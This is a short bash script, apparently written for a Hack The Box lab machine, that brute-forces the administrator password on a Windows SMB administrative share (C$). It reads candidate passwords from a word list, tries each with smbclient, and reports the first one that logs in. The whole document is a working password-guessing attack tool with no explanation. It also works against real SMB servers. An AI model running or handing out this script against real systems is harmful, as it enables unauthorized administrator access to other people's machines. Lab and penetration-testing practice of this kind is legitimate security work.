#!/bin/bash

password_file="/home/kali/htb/escape/strings.txt"
server="10.10.11.202"
share="C$"
success=false

while IFS= read -r password; do
    echo "Trying password:" $password
    smbclient --user="administrator%$password" "\\\\$server\\$share" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "Successful login with password: $password"
        success=true
        break
    fi
done < "$password_file"

if [ "$success" = false ]; then
    echo "Login attempt unsuccessful with all passwords."
fi
